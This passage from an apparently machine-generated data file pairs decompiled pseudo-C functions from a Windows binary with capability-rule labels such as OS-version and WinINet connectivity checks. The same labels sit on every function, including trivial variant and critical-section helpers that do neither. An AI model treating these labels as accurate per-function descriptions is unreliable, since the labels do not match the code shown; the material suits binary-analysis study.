fcn.00405584(var_2ch, var_28h, var_24h);\n        break;\n    case 5:\n        fVar3 = *(param_2 + 4);\n        var_2ch = SUB104(fVar3, 0);\n        var_28h = fVar3 >> 0x20;\n        var_24h._0_1_ = fVar3 >> 0x40;\n        var_18h = &stack0xfffffffc;\n        fcn.0040b6e0(var_2ch);\n        fcn.00405584(var_2ch, var_28h, var_24h);\n        break;\n    case 6:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.00414754(var_28h, *(param_2 + 6));\n        fcn.004057d4();\n        break;\n    case 7:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.0041478c(var_28h, *(param_2 + 6));\n        fcn.004057d4();\n        break;\n    case 8:\n        var_18h = &stack0xfffffffc;\n        fcn.00405f58(&fcn.00414a44::var_1ch);\n        var_28h = 0x414bd7;\n        fcn.004057d4();\n        break;\n    case 9:\n    case 0xd:\n        var_18h = &stack0xfffffffc;\n        fcn.0041488c();\n        fcn.00405584();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            var_18h = &stack0xfffffffc;\n            fcn.00405584();\n        }\n        else if (uVar1 == 0x101) {\n            var_18h = &stack0xfffffffc;\n            fcn.00414958();\n            fcn.00405584();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            var_18h = &stack0xfffffffc;\n            fcn.00405530();\n            cVar2 = fcn.004149bc();\n            if (cVar2 == '\\0') {\n                fcn.0041488c();\n                fcn.00405584();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x414d06\n            switch(uVar1 & 0xbfff) {\n            default:\n                var_18h = &stack0xfffffffc;\n                fcn.0041488c();\n                fcn.00405584();\n                break;\n            case 2:\n                var_18h = &stack0xfffffffc;\n                fcn.00409d70();\n                fcn.00405584();\n                break;\n            case 3:\n                var_18h = &stack0xfffffffc;\n                fcn.00409d70();\n                fcn.00405584();\n                break;\n            case 4:\n                fVar3 = **(param_2 + 4);\n                var_2ch = SUB104(fVar3, 0);\n                var_28h = fVar3 >> 0x20;\n                var_24h._0_1_ = fVar3 >> 0x40;\n                var_18h = &stack0xfffffffc;\n                fcn.0040b6e0(var_2ch);\n                fcn.00405584(var_2ch, var_28h, var_24h);\n                break;\n            case 5:\n                fVar3 = **(param_2 + 4);\n                var_2ch = SUB104(fVar3, 0);\n                var_28h = fVar3 >> 0x20;\n                var_24h._0_1_ = fVar3 >> 0x40;\n                var_18h = &stack0xfffffffc;\n                fcn.0040b6e0(var_2ch);\n                fcn.00405584(var_2ch, var_28h, var_24h);\n                break;\n            case 6:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00414754(var_28h, (*(param_2 + 4))[1]);\n                fcn.004057d4();\n                break;\n            case 7:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.0041478c(var_28h, (*(param_2 + 4))[1]);\n                fcn.004057d4();\n                break;\n            case 8:\n                var_18h = &stack0xfffffffc;\n                fcn.00405758();\n                break;\n            case 0xb:\n                var_18h = &stack0xfffffffc;\n                fcn.004147c4();\n                fcn.004057d4();\n                break;\n            case 0xc:\n                var_18h = &stack0xfffffffc;\n                fcn.00414a44();\n                break;\n            case 0x10:\n                var_18h = &stack0xfffffffc;\n                fcn.00409d70();\n                fcn.00405584();\n                break;\n            case 0x11:\n                var_18h = &stack0xfffffffc;\n                fcn.00409d70();\n                fcn.00405584();\n                break;\n            case 0x12:\n                var_18h = &stack0xfffffffc;\n                fcn.00409d70();\n                fcn.00405584();\n                break;\n            case 0x13:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00409e5c(var_28h);\n                fcn.00405584(var_28h, 0);\n                break;\n            case 0x14:\n                var_24h._0_1_ = (*(param_2 + 4))[1];\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00409e5c(var_28h);\n                fcn.00405584(var_28h, var_24h);\n            }\n        }\n        break;\n    case 0xb:\n        var_18h = &stack0xfffffffc;\n        fcn.004147c4();\n        fcn.004057d4();\n        break;\n    case 0xc:\n        var_18h = &stack0xfffffffc;\n        fcn.00414a44();\n        break;\n    case 0x10:\n        var_18h = &stack0xfffffffc;\n        fcn.00409d70();\n        fcn.00405584();\n        break;\n    case 0x11:\n        var_18h = &stack0xfffffffc;\n        fcn.00409d70();\n        fcn.00405584();\n        break;\n    case 0x12:\n        var_18h = &stack0xfffffffc;\n        fcn.00409d70();\n        fcn.00405584();\n        break;\n    case 0x13:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.00409e5c(var_28h);\n        fcn.00405584(var_28h, 0);\n        break;\n    case 0x14:\n        var_24h._0_1_ = *(param_2 + 6);\n        var_28h = *(param_2 + 4);\n        fcn.00409e5c(var_28h);\n        fcn.00405584(var_28h, var_24h);\n    }\n    *in_FS_OFFSET = var_28h;\n    var_20h = 0x414f77;\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 2564
    },
    "0041509c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041509c(uint param_1, uint *param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint pvarg;\n    uint var_14h;\n    int32_t *var_ch;\n    char var_5h;\n    uint *var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    if (param_2 != NULL) {\n        *param_2 = 0;\n    }\n    uStack48 = 0x415154;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x4150d1;\n    var_4h = param_2;\n    var_5h = fcn.00416178();\n    if (var_5h != '\\0') {\n        puStack56 = &fcn.0041509c::pvarg;\n        puStack60 = 0x4150e3;\n        sub.oleaut32.dll_VariantInit();\n        uStack64 = 0x415137;\n        uStack68 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffbc;\n        puStack60 = &stack0xfffffffc;\n        (**(*var_ch + 0x1c))(8);\n        arg_8h = var_4h;\n        fcn.00405e6c();\n        fcn.00405f58(arg_8h);\n        *in_FS_OFFSET = arg_8h;\n        uStack68 = 0x41513e;\n        fcn.0041163c();\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x41515b;\n    uStack48 = 0x415153;\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 454
    },
    "00415164": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00415164(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    float10 fVar4;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = &stack0xfffffffc;\n    iVar3 = 0xe;\n    do {\n        var_4h = 0;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_18h = 0x4156a9;\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00415164::var_1ch;\n    uVar1 = *param_2;\n    // switch table (21 cases) at 0x41519d\n    switch(uVar1) {\n    case 0:\n        var_14h = &stack0xfffffffc;\n        fcn.00405d28();\n        break;\n    case 1:\n        var_14h = &stack0xfffffffc;\n        if (*0x491a5c != '\\0') {\n            var_14h = &stack0xfffffffc;\n            fcn.00410e58();\n        }\n        fcn.00405ea8();\n        break;\n    case 2:\n        var_14h = &stack0xfffffffc;\n        fcn.00409d70();\n        fcn.00405ea8();\n        break;\n    case 3:\n        var_14h = &stack0xfffffffc;\n        fcn.00409d70();\n        fcn.00405ea8();\n        break;\n    case 4:\n        fVar4 = *(param_2 + 4);\n        var_28h = SUB104(fVar4, 0);\n        var_24h = fVar4 >> 0x20;\n        var_20h._0_1_ = fVar4 >> 0x40;\n        var_14h = &stack0xfffffffc;\n        fcn.0040b6e0(var_28h);\n        fcn.00405ea8(var_28h, var_24h, var_20h);\n        break;\n    case 5:\n        fVar4 = *(param_2 + 4);\n        var_28h = SUB104(fVar4, 0);\n        var_24h = fVar4 >> 0x20;\n        var_20h._0_1_ = fVar4 >> 0x40;\n        var_14h = &stack0xfffffffc;\n        fcn.0040b6e0(var_28h);\n        fcn.00405ea8(var_28h, var_24h, var_20h);\n        break;\n    case 6:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.00414754(var_24h, *(param_2 + 6));\n        fcn.00405d64();\n        break;\n    case 7:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.0041478c(var_24h, *(param_2 + 6));\n        fcn.00405d64();\n        break;\n    case 8:\n        var_24h = 0x4152e9;\n        var_14h = &stack0xfffffffc;\n        fcn.00405f58(in_EAX);\n        break;\n    case 9:\n    case 0xd:\n        var_14h = &stack0xfffffffc;\n        fcn.00414f80();\n        fcn.00405d64();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            var_14h = &stack0xfffffffc;\n            fcn.00405ea8();\n        }\n        else if (uVar1 == 0x101) {\n            var_14h = &stack0xfffffffc;\n            fcn.00415038();\n            fcn.00405d64();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            var_14h = &stack0xfffffffc;\n            fcn.00405d28();\n            cVar2 = fcn.0041509c();\n            if (cVar2 == '\\0') {\n                fcn.00414f80();\n                fcn.00405d64();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x415418\n            switch(uVar1 & 0xbfff) {\n            default:\n                var_14h = &stack0xfffffffc;\n                fcn.00414f80();\n                fcn.00405d64();\n                break;\n            case 2:\n                var_14h = &stack0xfffffffc;\n                fcn.00409d70();\n                fcn.00405ea8();\n                break;\n            case 3:\n                var_14h = &stack0xfffffffc;\n                fcn.00409d70();\n                fcn.00405ea8();\n                break;\n            case 4:\n                fVar4 = **(param_2 + 4);\n                var_28h = SUB104(fVar4, 0);\n                var_24h = fVar4 >> 0x20;\n                var_20h._0_1_ = fVar4 >> 0x40;\n                var_14h = &stack0xfffffffc;\n                fcn.0040b6e0(var_28h);\n                fcn.00405ea8(var_28h, var_24h, var_20h);\n                break;\n            case 5:\n                fVar4 = **(param_2 + 4);\n                var_28h = SUB104(fVar4, 0);\n                var_24h = fVar4 >> 0x20;\n                var_20h._0_1_ = fVar4 >> 0x40;\n                var_14h = &stack0xfffffffc;\n                fcn.0040b6e0(var_28h);\n                fcn.00405ea8(var_28h, var_24h, var_20h);\n                break;\n            case 6:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00414754(var_24h, (*(param_2 + 4))[1]);\n                fcn.00405d64();\n                break;\n            case 7:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.0041478c(var_24h, (*(param_2 + 4))[1]);\n                fcn.00405d64();\n                break;\n            case 8:\n                var_14h = &stack0xfffffffc;\n                fcn.00405e6c();\n                break;\n            case 0xb:\n                var_14h = &stack0xfffffffc;\n                fcn.004147c4();\n                fcn.00405d64();\n                break;\n            case 0xc:\n                var_14h = &stack0xfffffffc;\n                fcn.00415164();\n                break;\n            case 0x10:\n                var_14h = &stack0xfffffffc;\n                fcn.00409d70();\n                fcn.00405ea8();\n                break;\n            case 0x11:\n                var_14h = &stack0xfffffffc;\n                fcn.00409d70();\n                fcn.00405ea8();\n                break;\n            case 0x12:\n                var_14h = &stack0xfffffffc;\n                fcn.00409d70();\n                fcn.00405ea8();\n                break;\n            case 0x13:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00409e5c(var_24h);\n                fcn.00405ea8(var_24h, 0);\n                break;\n            case 0x14:\n                var_20h._0_1_ = (*(param_2 + 4))[1];\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00409e5c(var_24h);\n                fcn.00405ea8(var_24h, var_20h);\n            }\n        }\n        break;\n    case 0xb:\n        var_14h = &stack0xfffffffc;\n        fcn.004147c4();\n        fcn.00405d64();\n        break;\n    case 0xc:\n        var_14h = &stack0xfffffffc;\n        fcn.00415164();\n        break;\n    case 0x10:\n        var_14h = &stack0xfffffffc;\n        fcn.00409d70();\n        fcn.00405ea8();\n        break;\n    case 0x11:\n        var_14h = &stack0xfffffffc;\n        fcn.00409d70();\n        fcn.00405ea8();\n        break;\n    case 0x12:\n        var_14h = &stack0xfffffffc;\n        fcn.00409d70();\n        fcn.00405ea8();\n        break;\n    case 0x13:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.00409e5c(var_24h);\n        fcn.00405ea8(var_24h, 0);\n        break;\n    case 0x14:\n        var_20h._0_1_ = *(param_2 + 6);\n        var_24h = *(param_2 + 4);\n        fcn.00409e5c(var_24h);\n        fcn.00405ea8(var_24h, var_20h);\n    }\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x4156b0;\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 2600
    },
    "004157fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004157fc(uint param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    \n    iVar1 = *param_2;\n    if (iVar1 == 0) {\n        fcn.0040700c(param_1);\n    }\n    else if (iVar1 == 1) {\n        if (*0x491a5c != '\\0') {\n            fcn.00410e58();\n        }\n        fcn.0040700c(param_1);\n    }\n    else if (iVar1 == 9) {\n        fcn.00407024();\n    }\n    else if (iVar1 == 0x4009) {\n        fcn.00407024();\n    }\n    else {\n        cVar2 = fcn.00416178();\n        if (cVar2 != '\\0') {\n            fcn.0040700c(param_1);\n            cVar2 = fcn.00404704();\n            if (cVar2 != '\\0') {\n                return;\n            }\n        }\n        fcn.00410e58();\n    }\n    return;\n}\n",
        "token_count": 249
    },
    "004158a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004158a8(char param_1, uint param_2)\n\n{\n    uint16_t *in_EAX;\n    \n    if ((*in_EAX & 0xbfe8) != 0) {\n        fcn.004115c0();\n    }\n    if (*0x491a64 == '\\0') {\n        *in_EAX = 3;\n    }\n    else {\n        *in_EAX = *(param_1 * 2 + 0x491a78);\n    }\n    *(in_EAX + 4) = param_2;\n    return;\n}\n",
        "token_count": 129
    },
    "00415ed4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00415ed4(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    \n    uStack16 = 0x499994;\n    puStack20 = 0x415ee8;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack24 = 0x415f35;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    iVar1 = fcn.0040676c();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            if (*(*0x499990 + iVar1 * 4) != *0x491a6c) {\n                fcn.00404650();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x415f3c;\n    uStack24 = 0x499994;\n    uStack28 = 0x415f34;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 279
    },
    "00416178": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __fastcall fcn.00416178(uint param_1, uint *param_2)\n\n{\n    bool bVar1;\n    uint16_t in_AX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint var_1h;\n    \n    if (((*0x499990 == 0) || (in_AX < 0x100)) || (0x7ff < in_AX)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        uStack24 = 0x499994;\n        puStack28 = 0x4161b3;\n        sub.kernel32.dll_EnterCriticalSection();\n        uStack32 = 0x416220;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &fcn.00416178::var_1h + 1;\n        iVar2 = fcn.0040676c();\n        if (in_AX - 0x100 < iVar2) {\n            *param_2 = *(*0x499990 + -0x400 + in_AX * 4);\n        }\n        *in_FS_OFFSET = uStack36;\n        puStack28 = 0x416227;\n        uStack32 = 0x499994;\n        uStack36 = 0x41621f;\n        uVar3 = sub.kernel32.dll_LeaveCriticalSection();\n        return uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 374
    },
    "00416540": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00416540(void)\n\n{\n    char cVar1;\n    char *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*in_EAX == '\\x01') {\n        uVar2 = fcn.00409edc();\n        return uVar2;\n    }\n    iVar3 = fcn.004164e8();\n    if (*(iVar3 + 1) < 0) {\n        cVar1 = fcn.00409a84();\n        if (cVar1 == '\\0') {\n            cVar1 = fcn.00409a84();\n            if (cVar1 == '\\0') {\n                uVar2 = fcn.00409edc();\n            }\n            else {\n                uVar2 = 0xffffffff;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = fcn.004164f4();\n    }\n    return uVar2;\n}\n",
        "token_count": 216
    },
    "00416614": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00416614(uint param_1, uint *param_2)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint8_t uVar5;\n    \n    pcVar1 = **param_2;\n    uVar5 = 4;\n    if (*pcVar1 != '\\a') {\n        uVar5 = pcVar1[pcVar1[1] + 2];\n    }\n    pcVar2 = param_2[1];\n    if (*(param_2 + 7) < 0xfe) {\n        uVar3 = (*pcVar2)();\n    }\n    else if (*(param_2 + 7) == 0xff) {\n        puVar4 = (pcVar2 & 0xffffff) + in_EAX;\n        uVar3 = in_EAX & 0xffffff00 | *puVar4;\n        if ((1 < uVar5) && (uVar3 = in_EAX & 0xffff0000 | *puVar4,  3 < uVar5)) {\n            uVar3 = *puVar4;\n        }\n    }\n    else {\n        uVar3 = (**(pcVar2 + *in_EAX))();\n    }\n    if (uVar5 < 4) {\n        if (uVar5 < 2) {\n            uVar3 = uVar3;\n            if (uVar5 != 0) {\n                return uVar3 & 0xff;\n            }\n        }\n        else {\n            uVar3 = uVar3;\n            if (uVar5 != 2) {\n                uVar3 = uVar3 & 0xffff;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 397
    },
    "0041a034": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a034(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 4) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 4) + 4))(*(arg_8h + 4));\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "0041a054": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a054(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 4) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 4) + 8))(*(arg_8h + 4));\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "004207b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004207b0(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0x20) + 4))(*(arg_8h + 0x20));\n    }\n    return uVar1;\n}\n",
        "token_count": 101
    },
    "004207d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004207d0(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0x20) + 8))(*(arg_8h + 0x20));\n    }\n    return uVar1;\n}\n",
        "token_count": 101
    },
    "004185c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004185c8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    if (in_EDX == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.00418568();\n    }\n    if (in_ECX == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.00418568();\n    }\n    if ((iVar1 != 0) && (iVar2 != 0)) {\n        fcn.0040487c();\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "00418638": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00418638(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0xc) = uVar1;\n    fcn.00419740();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 195
    },
    "00418780": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00418780(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed4;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack284 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack288 = 0x418830;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack292;\n    fcn.00404530();\n    fcn.00405794();\n    iVar1 = fcn.004186d4();\n    if (iVar1 != 0) {\n        var_10ch = var_4h;\n        var_108h._0_1_ = 0xb;\n        in_stack_fffffed4 = 0;\n        fcn.0040dbf4(0, &var_10ch);\n        fcn.00404ec4();\n    }\n    if (*(in_EAX + 4) == 0) {\n        uVar2 = fcn.00404620();\n        *(in_EAX + 4) = uVar2;\n    }\n    fcn.00419740();\n    *in_FS_OFFSET = in_stack_fffffed4;\n    uStack292 = 0x418837;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 349
    },
    "00418884": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
